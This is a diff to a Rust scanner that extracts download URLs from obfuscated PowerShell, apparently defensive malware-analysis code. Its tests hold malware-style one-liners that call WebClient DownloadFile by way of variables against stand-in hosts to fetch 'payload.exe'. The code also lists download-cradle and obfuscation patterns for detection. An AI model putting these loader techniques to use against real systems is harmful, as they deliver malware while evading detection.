@@ -7282,29 +8871,95 @@ fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
 
     let mut seen = std::collections::HashSet::new();
     let mut urls = Vec::new();
-    for caps in DYNAMIC_DOWNLOAD_INVOKE_RE.captures_iter(text) {
-        if let Some(literal) = caps.get(2) {
-            let Some(url) = crate::deob_scan::normalize_liberal_url_token(literal.as_str()) else {
+    let scan_texts: Vec<&str> = std::iter::once(text)
+        .chain(string_bindings.values().map(String::as_str))
+        .collect();
+    for scan_text in &scan_texts {
+        for caps in DYNAMIC_DOWNLOAD_INVOKE_RE.captures_iter(scan_text) {
+            if let Some(literal) = caps.get(2) {
+                let Some(url) = crate::deob_scan::normalize_liberal_url_token(literal.as_str())
+                else {
+                    continue;
+                };
+                if seen.insert(url.clone()) {
+                    urls.push(url);
+                }
+                continue;
+            }
+
+            let Some(var) = caps.get(1) else {
                 continue;
             };
-            if seen.insert(url.clone()) {
-                urls.push(url);
+            if let Some(values) = foreach_urls.get(&var.as_str().to_ascii_lowercase()) {
+                for url in values {
+                    if seen.insert(url.clone()) {
+                        urls.push(url.clone());
+                    }
+                }
             }
-            continue;
         }
+    }
 
-        let Some(var) = caps.get(1) else {
-            continue;
-        };
-        if let Some(values) = foreach_urls.get(&var.as_str().to_ascii_lowercase()) {
-            for url in values {
+    for scan_text in &scan_texts {
+        for caps in DYNAMIC_VAR_METHOD_INVOKE_RE.captures_iter(scan_text) {
+            let Some(method_var) = caps.get(1) else {
+                continue;
+            };
+            let Some(method) = string_bindings.get(&method_var.as_str().to_ascii_lowercase())
+            else {
+                continue;
+            };
+            if !is_dynamic_download_method(method) {
+                continue;
+            }
+
+            if let Some(literal) = caps.get(3) {
+                let Some(url) = crate::deob_scan::normalize_liberal_url_token(literal.as_str())
+                else {
+                    continue;
+                };
                 if seen.insert(url.clone()) {
-                    urls.push(url.clone());
+                    urls.push(url);
+                }
+                continue;
+            }
+
+            let Some(var) = caps.get(2) else {
+                continue;
+            };
+            let var_name = var.as_str().to_ascii_lowercase();
+            if let Some(url) = string_bindings
+                .get(&var_name)
+                .and_then(|value| crate::deob_scan::normalize_liberal_url_token(value))
+            {
+                if seen.insert(url.clone()) {
+                    urls.push(url);
+                }
+                continue;
+            }
+            if let Some(values) = foreach_urls.get(&var_name) {
+                for url in values {
+                    if seen.insert(url.clone()) {
+                        urls.push(url.clone());
+                    }
                 }
             }
         }
     }
     urls
+}
+
+fn is_dynamic_download_method(method: &str) -> bool {
+    matches!(
+        method.to_ascii_lowercase().as_str(),
+        "downloadstring"
+            | "downloadstringasync"
+            | "downloadstringtaskasync"
+            | "downloadfile"
+            | "downloaddata"
+            | "openreadasync"
+            | "down"
+    )
 }
 
 #[cfg(test)]
@@ -7345,6 +9000,24 @@ mod dynamic_download_invoke_tests {
         );
 
         assert_eq!(urls, vec!["https://dyn-concat-method.example/a.ps1"]);
+    }
+
+    #[test]
+    fn dynamic_variable_method_and_url_invoke_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$spyd='DownloadFile';$stjern='https://dyn-var-method.example/payload.exe';$b=New-Object Net.WebClient;$b.$spyd.Invoke($stjern,$sten)"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-var-method.example/payload.exe"]);
+    }
+
+    #[test]
+    fn dynamic_variable_method_in_assigned_invocation_body_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$spyd='DownloadFile';$stjern='https://dyn-assigned-body.example/payload.exe';$oprrsa='$siouxerf.$spyd.Invoke($stjern,$sten)';Skuri $oprrsa"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-assigned-body.example/payload.exe"]);
     }
 }
 
@@ -7516,6 +9189,9 @@ fn extract_herestring_replace_iex_inners(env: &mut Environment) {
     let mut seen: std::collections::HashSet<Vec<u8>> =
         env.all_extracted_ps1.iter().cloned().collect();
     for payload in payloads {
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            continue;
+        }
         let text = String::from_utf8_lossy(&payload).into_owned();
         // Candidate texts: the raw payload, plus one round of base64 decoding
         // for `[Convert]::FromBase64String('...')` wrappers.
@@ -7541,7 +9217,100 @@ fn extract_herestring_replace_iex_inners(env: &mut Environment) {
             }
         }
     }
-    env.all_extracted_ps1.extend(new_payloads);
+    for payload in new_payloads {
+        env.push_extracted_ps1(payload);
+    }
+}
+
+fn extract_inline_frombase64_ps1_inners(env: &mut Environment) {
+    let payloads = env.all_extracted_ps1.clone();
+    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
+    let mut seen: std::collections::HashSet<Vec<u8>> =
+        env.all_extracted_ps1.iter().cloned().collect();
+    for payload in payloads {
+        if env.check_timeout() {
+            return;
+        }
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            continue;
+        }
+        let text = decode_payload(&payload);
+        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
+            let Some(b64) = caps.get(1) else { continue };
+            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
+                continue;
+            };
+            if decoded.len() > 4 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
+                continue;
+            }
+            if seen.insert(decoded.clone()) {
+                new_payloads.push(decoded);
+            }
+        }
+    }
+    for payload in new_payloads {
+        env.push_extracted_ps1(payload);
+    }
+}
+
+fn extract_getstring_frombase64_var_inners(env: &mut Environment) {
+    let payloads = env.all_extracted_ps1.clone();
+    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
+    let mut seen: std::collections::HashSet<Vec<u8>> =
+        env.all_extracted_ps1.iter().cloned().collect();
+
+    for payload in payloads {
+        if env.check_timeout() {
+            return;
+        }
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            continue;
+        }
+        let text = decode_payload(&payload);
+        if !contains_ascii_case_insensitive(&text, "getstring")
+            || !contains_ascii_case_insensitive(&text, "frombase64string")
+        {
+            continue;
+        }
+        let bindings = ps_string_bindings(&text);
+        if bindings.is_empty() {
+            continue;
+        }
+        for caps in GETSTRING_B64_VAR_RE.captures_iter(&text).take(64) {
+            let Some(encoding) = caps.get(1) else {
+                continue;
+            };
+            let Some(var) = caps.get(2) else { continue };
+            let Some(b64) = bindings.get(&var.as_str().to_ascii_lowercase()) else {
+                continue;
+            };
+            let Some(decoded) = decode_ps_base64_string(b64) else {
+                continue;
+            };
+            if decoded.len() > 4 * 1024 * 1024 {
+                continue;
+            }
+            let bytes = match encoding.as_str().to_ascii_lowercase().as_str() {
+                "unicode" => match decode_utf16_lossy(&decoded, false) {
+                    Some(value) => value.into_bytes(),
+                    None => continue,
+                },
+                "bigendianunicode" => match decode_utf16_lossy(&decoded, true) {
+                    Some(value) => value.into_bytes(),
+                    None => continue,
+                },
+                _ => decoded,
+            };
+            if !looks_like_powershell_payload(&bytes) || !seen.insert(bytes.clone()) {
+                continue;
+            }
+            new_payloads.push(bytes);
+        }
+    }
+
+    for payload in new_payloads {
+        env.push_extracted_ps1(payload);
+    }
 }
 
 /// Walk every entry in `env.all_extracted_ps1` looking for a PowerShell RC4
@@ -7555,6 +9324,9 @@ fn extract_rc4_wrapper_inners(env: &mut Environment) {
         env.all_extracted_ps1.iter().cloned().collect();
 
     for payload in payloads {
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            continue;
+        }
         let text = decode_payload(&payload).into_owned();
         let mut candidates: Vec<String> = vec![text.clone()];
         for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
@@ -7578,7 +9350,9 @@ fn extract_rc4_wrapper_inners(env: &mut Environment) {
         }
     }
 
-    env.all_extracted_ps1.extend(new_payloads);
+    for payload in new_payloads {
+        env.push_extracted_ps1(payload);
+    }
 }
 
 fn extract_inline_xor_base64_function_inners(env: &mut Environment) {
@@ -7588,6 +9362,9 @@ fn extract_inline_xor_base64_function_inners(env: &mut Environment) {
         env.all_extracted_ps1.iter().cloned().collect();
 
     for payload in payloads {
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            continue;
+        }
         let text = decode_payload(&payload).into_owned();
         for decoded in decode_inline_xor_base64_functions(&text) {
             if seen.insert(decoded.clone()) {
@@ -7596,7 +9373,9 @@ fn extract_inline_xor_base64_function_inners(env: &mut Environment) {
         }
     }
 
-    env.all_extracted_ps1.extend(new_payloads);
+    for payload in new_payloads {
+        env.push_extracted_ps1(payload);
+    }
 }
 
 fn decode_rc4_wrapper_from_text(text: &str) -> Option<Vec<u8>> {
@@ -7752,7 +9531,45 @@ fn extract_herestring_replace_iex_from_text(text: &str) -> Vec<String> {
     out
 }
 
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_INVOKE_EXPRESSION_SINGLE_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)^\s*(?:iex|invoke-expression)\s*\(?\s*'((?:[^']|'')*)'\s*\)?\s*;?\s*$"#)
+        .expect("ps invoke-expression single literal regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_REVERSED_URL_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)([A-Za-z0-9._~:/?!$&*+=;,%\-]{8,400}//:(?:ptth|sptth))"#)
+        .expect("ps reversed url token regex")
+});
+
+fn extract_invoke_expression_literal_inners(env: &mut Environment) {
+    let payloads = env.all_extracted_ps1.clone();
+    for payload in payloads {
+        if env.check_timeout() {
+            return;
+        }
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            continue;
+        }
+        let raw_text = decode_payload(&payload);
+        let Some(caps) = PS_INVOKE_EXPRESSION_SINGLE_LITERAL_RE.captures(raw_text.trim()) else {
+            continue;
+        };
+        let Some(inner) = caps.get(1).map(|m| m.as_str().replace("''", "'")) else {
+            continue;
+        };
+        if inner.trim().len() < 16 {
+            continue;
+        }
+        env.push_extracted_ps1(inner.into_bytes());
+    }
+}
+
 pub fn scan_ps1_payloads(env: &mut Environment) {
+    if env.check_timeout() {
+        return;
+    }
     // Pre-pass: extract herestring + -replace + IEX inner payloads from raw
     // PS bytes, decoding one round of outer `[Convert]::FromBase64String(...)`
     // first. Adds decoded inners to `all_extracted_ps1` so the main scan loop
@@ -7760,13 +9577,28 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
     // noise stripper doesn't eat the `-replace` target chars from inside the
     // herestring body.
     extract_herestring_replace_iex_inners(env);
+    extract_inline_frombase64_ps1_inners(env);
+    extract_getstring_frombase64_var_inners(env);
+    extract_invoke_expression_literal_inners(env);
     extract_rc4_wrapper_inners(env);
     extract_inline_xor_base64_function_inners(env);
+    let mut expansion_cache: std::collections::HashMap<(bool, String), String> =
+        std::collections::HashMap::new();
     let file_backed_payloads = env.all_extracted_ps1.clone();
     for payload in file_backed_payloads {
+        if env.check_timeout() {
+            return;
+        }
         let raw_text = decode_payload(&payload);
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            continue;
+        }
         let raw_env_expanded = expand_ps_env_refs(&raw_text, env);
-        let text_expanded = expand_obfuscation_with_env(&raw_env_expanded, env);
+        let text_expanded =
+            expand_ps1_scan_text_cached(&raw_env_expanded, env, &mut expansion_cache, false);
+        if env.check_timeout() {
+            return;
+        }
         scan_file_backed_base64_ps1(&text_expanded, env, &text_expanded);
     }
 
@@ -7778,17 +9610,28 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
         .traits
         .iter()
         .filter_map(|t| match t {
-            Trait::UrlLaunch { url, .. } | Trait::UrlArgument { url, .. } => Some(url.clone()),
+            Trait::UrlLaunch { url, .. } => Some(url.clone()),
             _ => None,
         })
         .collect();
 
     for (idx, payload) in payloads.iter().enumerate() {
+        if env.check_timeout() {
+            return;
+        }
         let raw_text = decode_payload(payload);
         let raw_owned: String = raw_text.clone().into_owned();
+        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
+            scan_large_ps1_payload_fast(&raw_owned, env);
+            continue;
+        }
         let raw_env_expanded = expand_ps_env_refs(&raw_owned, env);
 
-        let text_expanded = expand_obfuscation_with_env(&raw_env_expanded, env);
+        let text_expanded =
+            expand_ps1_scan_text_cached(&raw_env_expanded, env, &mut expansion_cache, true);
+        if env.check_timeout() {
+            return;
+        }
         // Dual-scan: also run URL regexes over alias-expanded version so that
         // `iwr`, `irm`, `wget` etc. are caught even if obfuscation expansion
         // didn't surface them.
@@ -7799,12 +9642,12 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
             vec![text_expanded]
         };
 
-        // Use the first candidate for OutFile / snippet display.
+        // Use the first candidate for OutFile and fallback command context.
         let primary = &candidates[0];
 
-        let snippet = snippet_prefix(primary, 120);
-
         let regexes: &[&Lazy<Regex>] = &[
+            &PS_CMDLET_QUOTED_DQ_URL_RE,
+            &PS_CMDLET_QUOTED_SQ_URL_RE,
             &IWR_RE,
             &IRM_RE,
             &PS_SCHEMELESS_IP_CMDLET_RE,
@@ -7836,6 +9679,9 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                     if ps_url_inside_path_getfilename(text, url_match.start()) {
                         continue;
                     }
+                    if ps_url_is_secondary_downloadfile_argument_url(text, url_match.start()) {
+                        continue;
+                    }
                     let mut url = clean_ps_url(url_match.as_str());
                     if is_schemeless_ip_url(&url) {
                         url = format!("http://{url}");
@@ -7855,9 +9701,19 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                         .get(0)
                         .map(|m| logical_statement_at(text, m.start()))
                         .unwrap_or(primary);
+                    if let Some(name) = ps_url_assignment_name(statement, url_match.as_str()) {
+                        if !ps_text_uses_variable_as_download_source(text, &name) {
+                            env.traits.push(Trait::UrlVariable {
+                                name,
+                                url,
+                                cmd: ps_download_cmd_context(idx, statement, url_match.as_str()),
+                            });
+                            continue;
+                        }
+                    }
                     let dst_hint = outfile_hint_from(statement);
                     env.traits.push(Trait::Download {
-                        cmd: format!("(ps1 #{idx}) {snippet}"),
+                        cmd: ps_download_cmd_context(idx, statement, &url),
                         src: url,
                         dst: dst_hint,
                     });
@@ -7872,9 +9728,22 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                     continue;
                 }
                 env.traits.push(Trait::Download {
-                    cmd: format!("(ps1 #{idx}) {snippet}"),
+                    cmd: ps_download_cmd_context(idx, primary, &url),
                     src: url,
                     dst: outfile_hint_from(primary),
+                });
+            }
+
+            for url in ps_reversed_urls(text) {
+                if known_launch_urls.contains(&url) {
+                    continue;
+                }
+                if !seen.insert((idx, url.clone())) {
+                    continue;
+                }
+                env.traits.push(Trait::DownloadInDeobText {
+                    src: url,
+                    line_hint: "reversed-url".to_string(),
                 });
             }
 
@@ -7894,13 +9763,553 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
                     continue;
                 }
                 env.traits.push(Trait::Download {
-                    cmd: format!("(ps1 #{idx}) {snippet}"),
+                    cmd: ps_download_cmd_context(idx, primary, &url),
                     src: url,
                     dst: outfile_hint_from(primary),
                 });
             }
         }
     }
+}
+
+fn expand_ps1_scan_text_cached(
+    raw_env_expanded: &str,
+    env: &mut Environment,
+    expansion_cache: &mut std::collections::HashMap<(bool, String), String>,
+    full_dense_skip_nth: bool,
+) -> String {
+    let dense_skip = looks_like_dense_skip_nth_payload(raw_env_expanded);
+    let cache_mode = dense_skip && full_dense_skip_nth;
+    let key = (cache_mode, raw_env_expanded.to_string());
+    if let Some(expanded) = expansion_cache.get(&key) {
+        return expanded.clone();
+    }
+
+    let expanded = if dense_skip {
+        if full_dense_skip_nth {
+            expand_dense_skip_nth_payload(raw_env_expanded)
+        } else {
+            expand_skip_nth(raw_env_expanded)
+        }
+    } else if looks_like_keyed_base64_xor_payload(raw_env_expanded) {
+        expand_keyed_base64_xor_payload_fast(raw_env_expanded)
+    } else if looks_like_for_substring_stride_payload(raw_env_expanded) {
+        expand_for_substring_stride_fast_path_payload(raw_env_expanded)
+    } else {
+        expand_obfuscation_with_env(raw_env_expanded, env)
+    };
+    expansion_cache.insert(key, expanded.clone());
+    expanded
+}
+
+fn looks_like_keyed_base64_xor_payload(text: &str) -> bool {
+    contains_ascii_case_insensitive(text, "function")
+        && contains_ascii_case_insensitive(text, "frombase64st")
+        && contains_ascii_case_insensitive(text, "-bxor")
+        && text.contains("@(")
+}
+
+fn expand_keyed_base64_xor_payload_fast(text: &str) -> String {
+    let mut out = normalize_powershell_quotes(text);
+    out = repair_damaged_webclient_constructor_method(&out);
+    out = expand_keyed_base64_xor_string_fragments(&out);
+    expand_ps_variables(&out)
+}
+
+fn ps_download_cmd_context(idx: usize, context: &str, url: &str) -> String {
+    let context = trim_unmatched_trailing_wrapper_quote(context.trim());
+    if let Some(call) = ps_download_method_call_context(context, url) {
+        return format!("(ps1 #{idx}) {call}");
+    }
+    if context.len() <= 320 && !contains_long_hex_run(context) {
+        return format!("(ps1 #{idx}) {context}");
+    }
+
+    if let Some(pos) = context.find(url) {
+        let mut start = floor_char_boundary(context, pos.saturating_sub(120));
+        let prefix = &context[..pos];
+        if let Some(boundary) = prefix
+            .rfind(';')
+            .or_else(|| prefix.rfind('|'))
+            .or_else(|| prefix.rfind('='))
+        {
+            if boundary + 1 > start {
+                start = floor_char_boundary(context, boundary + 1);
+            }
+        }
+        let end = floor_char_boundary(context, (pos + url.len() + 120).min(context.len()));
+        let mut slice = context[start..end].trim().to_string();
+        if start > 0 {
+            slice.insert_str(0, "... ");
+        }
+        if end < context.len() {
+            slice.push_str(" ...");
+        }
+        return format!("(ps1 #{idx}) {slice}");
+    }
+
+    let end = floor_char_boundary(context, context.len().min(240));
+    let suffix = if end < context.len() { " ..." } else { "" };
+    format!("(ps1 #{idx}) {}{suffix}", context[..end].trim())
+}
+
+fn ps_url_assignment_name(statement: &str, raw_url: &str) -> Option<String> {
+    let trimmed = statement.trim();
+    if contains_ascii_case_insensitive(trimmed, "downloadfile")
+        || contains_ascii_case_insensitive(trimmed, "downloadstring")
+        || contains_ascii_case_insensitive(trimmed, "loadstring")
+        || contains_ascii_case_insensitive(trimmed, "adstring")
+        || contains_ascii_case_insensitive(trimmed, "invoke-webrequest")
+        || contains_ascii_case_insensitive(trimmed, "invoke-restmethod")
+        || contains_ascii_case_insensitive(trimmed, " start-process ")
+    {
+        return None;
+    }
+    if let Some(caps) = PS_URL_ASSIGNMENT_RE.captures(trimmed) {
+        if let Some(full) = caps.get(0) {
+            if assignment_value_starts_with_url(trimmed, full.end(), raw_url) {
+                return caps.get(1).map(|m| m.as_str().to_string());
+            }
+        }
+    }
+    if let Some(name) = BATCH_SET_URL_ASSIGNMENT_RE
+        .captures(trimmed)
+        .and_then(|caps| {
+            let full = caps.get(0)?;
+            if assignment_value_starts_with_url(trimmed, full.end(), raw_url) {
+                caps.get(1).map(|m| m.as_str().to_string())
+            } else {
+                None
+            }
+        })
+    {
+        return Some(name);
+    }
+
+    if contains_ascii_case_insensitive(trimmed, "powershell") {
+        if let Some(pos) = trimmed.find('$') {
+            if let Some(name) = ps_url_assignment_name(&trimmed[pos..], raw_url) {
+                return Some(name);
+            }
+        }
+        if let Some(pos) = find_ascii_case_insensitive_from(trimmed, "set ", 0) {
+            if let Some(name) = ps_url_assignment_name(&trimmed[pos..], raw_url) {
+                return Some(name);
+            }
+        }
+    }
+
+    None
+}
+
+fn assignment_value_starts_with_url(statement: &str, value_start: usize, raw_url: &str) -> bool {
+    let Some(tail) = statement.get(value_start..) else {
+        return false;
+    };
+    let tail = tail.trim_start();
+    let tail = tail
+        .strip_prefix('"')
+        .or_else(|| tail.strip_prefix('\''))
+        .unwrap_or(tail);
+    tail.starts_with(raw_url)
+}
+
+fn ps_text_uses_variable_as_download_source(text: &str, name: &str) -> bool {
+    if !contains_ascii_case_insensitive(text, "invoke-webrequest")
+        && !contains_ascii_case_insensitive(text, "invoke-restmethod")
+        && !contains_ascii_case_insensitive(text, "downloadfile")
+        && !contains_ascii_case_insensitive(text, "downloadstring")
+        && !contains_ascii_case_insensitive(text, "curl")
+        && !contains_ascii_case_insensitive(text, "wget")
+    {
+        return false;
+    }
+    let lower = text.to_ascii_lowercase();
+    let name = name.to_ascii_lowercase();
+    lower.contains(&format!("${name}")) || lower.contains(&format!("!{name}!"))
+}
+
+fn ps_url_is_secondary_downloadfile_argument_url(text: &str, url_start: usize) -> bool {
+    let Some(prefix) = text.get(..url_start) else {
+        return false;
+    };
+    let Some(quote_start) = prefix.rfind(['\'', '"']) else {
+        return false;
+    };
+    let quote = text.as_bytes()[quote_start];
+    let Some(literal_tail) = text.get(quote_start + 1..) else {
+        return false;
+    };
+    let Some(quote_end_rel) = literal_tail.as_bytes().iter().position(|&b| b == quote) else {
+        return false;
+    };
+    let quote_end = quote_start + 1 + quote_end_rel;
+    if url_start >= quote_end {
+        return false;
+    }
+
+    let lower_before_quote = text[..quote_start].to_ascii_lowercase();
+    let Some(method_pos) = lower_before_quote.rfind("downloadfile") else {
+        return false;
+    };
+    let Some(open_rel) = text[method_pos..quote_start].find('(') else {
+        return false;
+    };
+    let open = method_pos + open_rel;
+    if !text[open + 1..quote_start].trim().is_empty() {
+        return false;
+    }
+
+    let literal_before_url = &text[quote_start + 1..url_start];
+    literal_before_url.contains("://")
+        || crate::deob_scan::normalize_liberal_url_token(literal_before_url).is_some()
+}
+
+fn ps_download_method_call_context<'a>(context: &'a str, url: &str) -> Option<&'a str> {
+    let url_pos = context.find(url)?;
+    let lower = context.to_ascii_lowercase();
+    let prefix = &lower[..url_pos.min(lower.len())];
+    let method_pos = prefix
+        .rfind("downloadfile")
+        .or_else(|| prefix.rfind("downloadstring"))?;
+    let open_rel = context[method_pos..].find('(')?;
+    let open = method_pos + open_rel;
+    let end = matching_ps_call_end(context, open).unwrap_or_else(|| {
+        floor_char_boundary(context, (url_pos + url.len() + 80).min(context.len()))
+    });
+
+    let mut start = method_call_context_start(context, method_pos);
+    while start < method_pos
+        && context[start..]
+            .chars()
+            .next()
+            .is_some_and(|ch| ch.is_whitespace() || ch == '\'' || ch == '"')
+    {
+        start += context[start..]
+            .chars()
+            .next()
+            .map(char::len_utf8)
+            .unwrap_or(1);
+    }
+    let slice = context[start..end].trim();
+    (!slice.is_empty() && slice.contains(url)).then_some(slice)
+}
+
+fn method_call_context_start(context: &str, method_pos: usize) -> usize {
+    let prefix = &context[..method_pos];
+    let boundary = prefix
+        .rfind(';')
+        .or_else(|| prefix.rfind('|'))
+        .or_else(|| prefix.rfind('='))
+        .map(|idx| idx + 1)
+        .unwrap_or(0);
+    floor_char_boundary(context, boundary)
+}
+
+fn matching_ps_call_end(context: &str, open: usize) -> Option<usize> {
+    let mut depth = 0usize;
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+    for (idx, ch) in context[open..].char_indices() {
+        let abs = open + idx;
+        if let Some(q) = quote {
+            if escaped {
+                escaped = false;
+                continue;
+            }
+            if ch == '`' || ch == '\\' {
+                escaped = true;
+                continue;
+            }
+            if ch == q {
+                quote = None;
+            }
+            continue;
+        }
+        match ch {
+            '\'' | '"' => quote = Some(ch),
+            '(' => depth += 1,
+            ')' => {
+                depth = depth.saturating_sub(1);
+                if depth == 0 {
+                    return Some(abs + ch.len_utf8());
+                }
+            }
+            _ => {}
+        }
+    }
+    None
+}
+
+fn trim_unmatched_trailing_wrapper_quote(context: &str) -> &str {
+    let Some(last) = context.as_bytes().last().copied() else {
+        return context;
+    };
+    if last != b'"' && last != b'\'' {
+        return context;
+    }
+    if ascii_quote_count_is_odd(context.as_bytes(), last) {
+        context[..context.len() - 1].trim_end()
+    } else {
+        context
+    }
+}
+
+fn ascii_quote_count_is_odd(bytes: &[u8], quote: u8) -> bool {
+    let mut count = 0usize;
+    let mut escaped = false;
+    for &byte in bytes {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        if byte == b'`' || byte == b'\\' {
+            escaped = true;
+            continue;
+        }
+        if byte == quote {
+            count += 1;
+        }
+    }
+    count % 2 == 1
+}
+
+fn contains_long_hex_run(value: &str) -> bool {
+    let mut run = 0usize;
+    for byte in value.bytes() {
+        if byte.is_ascii_hexdigit() {
+            run += 1;
+            if run >= 96 {
+                return true;
+            }
+        } else {
+            run = 0;
+        }
+    }
+    false
+}
+
+fn ps_reversed_urls(text: &str) -> Vec<String> {
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("//:ptth") && !lower.contains("//:sptth") {
+        return Vec::new();
+    }
+    let mut out = Vec::new();
+    let mut seen = std::collections::HashSet::new();
+    for caps in PS_REVERSED_URL_TOKEN_RE.captures_iter(text).take(32) {
+        let Some(token) = caps.get(1) else { continue };
+        let token = token
+            .as_str()
+            .trim_start_matches(|ch: char| !ch.is_ascii_lowercase());
+        if token.is_empty() {
+            continue;
+        }
+        let reversed = reverse_literal_value(token);
+        let Some(url) = crate::deob_scan::normalize_liberal_url_token(&reversed) else {
+            continue;
+        };
+        if seen.insert(url.clone()) {
+            out.push(url);
+        }
+    }
+    out
+}
+
+const LARGE_PS1_FAST_PATH_BYTES: usize = 96 * 1024;
+const LARGE_PS1_REPORT_FAST_PATH_BYTES: usize = 96 * 1024;
+
+fn expand_large_compressed_ps1_stage_before_sampling(
+    text: &str,
+    deadline: Option<std::time::Instant>,
+) -> (String, bool) {
+    if ps_deadline_expired(deadline)
+        || !contains_ascii_case_insensitive(text, "frombase64string")
+        || (!contains_ascii_case_insensitive(text, "gzipstream")
+            && !contains_ascii_case_insensitive(text, "deflatestream"))
+    {
+        return (text.to_string(), ps_deadline_expired(deadline));
+    }
+
+    let mut expanded = expand_gzip_function_base64_variables(text);
+    if ps_deadline_expired(deadline) {
+        return (expanded, true);
+    }
+    expanded = expand_gzip_base64_literals(&expanded);
+    if expanded == text {
+        return (expanded, ps_deadline_expired(deadline));
+    }
+
+    if let Some(stage) = invoked_literal_stage(&expanded) {
+        return (stage, ps_deadline_expired(deadline));
+    }
+    (expanded, ps_deadline_expired(deadline))
+}
+
+fn invoked_literal_stage(text: &str) -> Option<String> {
+    let bindings = ps_string_bindings(text);
+    if bindings.is_empty() {
+        return None;
+    }
+    for caps in PS_INVOKE_EXPRESSION_VAR_RE.captures_iter(text) {
+        let var = caps.get(1)?.as_str().to_ascii_lowercase();
+        let stage = bindings.get(&var)?;
+        if stage.trim().len() >= 128 {
+            return Some(stage.clone());
+        }
+    }
+    None
+}
+
+pub(crate) fn scan_large_ps1_payload_bytes_fast(payload: &[u8], env: &mut Environment) {
+    let text = decode_payload(payload);
+    scan_large_ps1_payload_fast(&text, env);
+}
+
+fn scan_large_ps1_payload_fast(text: &str, env: &mut Environment) {
+    if env.check_timeout() {
+        return;
+    }
+    if looks_like_deflate_xor_base64_assembly_loader(text) {
+        let sampled = head_tail_sample(text, 48 * 1024);
+        crate::deob_scan::scan_extracted_script_text(&sampled, env);
+        return;
+    }
+    let (large_text, timed_out) =
+        expand_large_compressed_ps1_stage_before_sampling(text, env.limits.deadline);
+    if timed_out {
+        env.note_timeout();
+        return;
+    }
+    let sampled = head_tail_sample(&large_text, 48 * 1024);
+    crate::deob_scan::scan_extracted_script_text(&sampled, env);
+    if env.check_timeout() {
+        return;
+    }
+    let sampled = expand_ps_env_refs(&sampled, env);
+    let (text_expanded, timed_out) = if looks_like_dense_skip_nth_payload(&sampled) {
+        (expand_dense_skip_nth_payload(&sampled), false)
+    } else if looks_like_for_substring_stride_payload(&sampled) {
+        (
+            expand_for_substring_stride_fast_path_payload(&sampled),
+            false,
+        )
+    } else if large_ps1_report_sample_needs_normalization(&sampled) {
+        expand_obfuscation_until(&sampled, env.limits.deadline)
+    } else {
+        (sampled, false)
+    };
+    if timed_out {
+        env.note_timeout();
+        return;
+    }
+    let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
+    let candidates: Vec<String> = if text_aliased != text_expanded {
+        vec![text_expanded, text_aliased]
+    } else {
+        vec![text_expanded]
+    };
+    let primary = &candidates[0];
+    let known_launch_urls: std::collections::HashSet<String> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::UrlLaunch { url, .. } => Some(url.clone()),
+            _ => None,
+        })
+        .collect();
+    let regexes: &[&Lazy<Regex>] = &[
+        &IWR_RE,
+        &IRM_RE,
+        &PS_SCHEMELESS_IP_CMDLET_RE,
+        &PS_SCHEMELESS_DOMAIN_CMDLET_RE,
+        &CURL_EXE_RE,
+        &MSHTA_URL_RE,
+        &DOWNLOADSTRING_RE,
+        &BARE_DOWNLOADSTRING_RE,
+        &DOWNLOADSTRING_FRAGMENT_RE,
+        &CALLBYNAME_DOWNLOADSTRING_RE,
+        &START_BITS_RE,
+        &START_BITS_SCHEMELESS_SOURCE_RE,
+        &NET_REQ_RE,
+        &PS_GENERIC_URL_RE,
+    ];
+    let mut seen = std::collections::HashSet::new();
+    for candidate in &candidates {
+        for re in regexes {
+            if env.check_timeout() {
+                return;
+            }
+            for caps in re.captures_iter(candidate) {
+                let Some(url_match) = caps.get(1) else {
+                    continue;
+                };
+                if ps_url_inside_non_download_hash_option(candidate, url_match.start())
+                    || ps_url_is_non_download_option_value(candidate, url_match.start())
+                    || ps_url_inside_path_getfilename(candidate, url_match.start())
+                {
+                    continue;
+                }
+                let mut url = clean_ps_url(url_match.as_str());
+                if is_schemeless_ip_url(&url) {
+                    url = format!("http://{url}");
+                }
+                let Some(url) = crate::deob_scan::normalize_liberal_url_token(&url)
+                    .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&url))
+                else {
+                    continue;
+                };
+                if known_launch_urls.contains(&url) || !seen.insert(url.clone()) {
+                    continue;
+                }
+                let statement = caps
+                    .get(0)
+                    .map(|m| logical_statement_at(candidate, m.start()))
+                    .unwrap_or(primary);
+                if let Some(name) = ps_url_assignment_name(statement, url_match.as_str()) {
+                    if !ps_text_uses_variable_as_download_source(candidate, &name) {
+                        env.traits.push(Trait::UrlVariable {
